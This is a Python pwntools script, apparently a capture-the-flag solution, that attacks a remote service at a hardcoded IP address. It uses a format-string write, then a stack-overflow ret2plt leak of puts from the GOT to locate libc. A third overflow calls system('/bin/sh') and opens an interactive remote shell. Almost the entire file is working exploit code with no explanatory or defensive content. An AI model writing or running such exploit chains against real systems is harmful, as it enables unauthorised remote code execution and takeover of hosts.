from pwn import *
import time

context(arch='i386', os='linux', log_level='info')

elf = ELF('d:/iscc/pwn2/pwn_permission')

HOST = '39.96.193.120'
PORT = 10000

SYSTEM_OFFSET = 0x41360
BINSH_OFFSET = 0x18c363
PUTS_OFFSET = 0x6d1e0

write_plt = elf.plt['write']
read_plt = elf.plt['read']
vuln_addr = elf.symbols['vuln']
puts_got = elf.got['puts']
target_val_addr = 0x804c030

RET_GADGET = 0x804900e
POP4_RET = 0x08049380

def test_second_overflow():
    conn = remote(HOST, PORT)
    data = conn.recv(timeout=5)
    
    fmt_payload = b'%5c%6$na' + p32(target_val_addr)
    conn.send(fmt_payload)
    time.sleep(2)
    
    response = conn.recv(timeout=5)
    if b'Input' not in response:
        log.warning("vuln not triggered!")
        conn.close()
        return
    
    log.success("vuln triggered!")
    
    # First overflow: leak puts, return to vuln
    payload1 = b'A' * 148
    payload1 += p32(write_plt)
    payload1 += p32(vuln_addr)
    payload1 += p32(1)
    payload1 += p32(puts_got)
    payload1 += p32(4)
    
    conn.send(payload1)
    time.sleep(1)
    
    try:
        leaked = conn.recv(timeout=3)
    except:
        log.warning("Connection closed after first overflow")
        conn.close()
        return
    
    puts_addr = None
    for i in range(len(leaked) - 3):
        candidate = u32(leaked[i:i+4])
        if 0xf7000000 < candidate < 0xf7ffffff:
            puts_addr = candidate
            break
    
    if not puts_addr:
        log.warning("No valid leak")
        conn.close()
        return
    
    log.success(f"puts@libc = 0x{puts_addr:x}")
    libc_base = puts_addr - PUTS_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET
    binsh_addr = libc_base + BINSH_OFFSET
    log.success(f"system = 0x{system_addr:x}, /bin/sh = 0x{binsh_addr:x}")
    
    # Wait for vuln's "Input:" prompt
    time.sleep(1)
    try:
        extra = conn.recv(timeout=2)
        log.info(f"Extra after leak: {extra[:50]}")
    except:
        pass
    
    # Second overflow: just call write() again to verify it works
    log.info("Testing second overflow with write()...")
    payload2 = b'B' * 148
    payload2 += p32(write_plt)
    payload2 += p32(vuln_addr)   # return to vuln after write
    payload2 += p32(1)           # fd
    payload2 += p32(puts_got)    # buf
    payload2 += p32(4)           # count
    
    conn.send(payload2)
    time.sleep(1)
    
    try:
        leaked2 = conn.recv(timeout=3)
        log.info(f"Second leak ({len(leaked2)} bytes): {leaked2.hex()}")
        
        for i in range(len(leaked2) - 3):
            candidate = u32(leaked2[i:i+4])
            if 0xf7000000 < candidate < 0xf7ffffff:
                log.success(f"Second leak puts = 0x{candidate:x} - SECOND OVERFLOW WORKS!")
                break
    except EOFError:
        log.warning("Second overflow FAILED - connection closed")
        conn.close()
        return
    
    # Third overflow: try system()
    time.sleep(1)
    try:
        extra = conn.recv(timeout=2)
    except:
        pass
    
    log.info("Trying system() in third overflow...")
    payload3 = b'C' * 148
    payload3 += p32(RET_GADGET)
    payload3 += p32(system_addr)
    payload3 += p32(0xdeadbeef)
    payload3 += p32(binsh_addr)
    
    conn.send(payload3)
    time.sleep(1)
    
    try:
        conn.sendline(b'echo SHELL')
        time.sleep(1)
        r = conn.recv(timeout=3)
        log.info(f"Response: {r}")
        if b'SHELL' in r:
            log.success("GOT SHELL!")
            conn.interactive()
    except EOFError:
        log.warning("system() crashed")
    except:
        pass
    
    conn.close()

test_second_overflow()
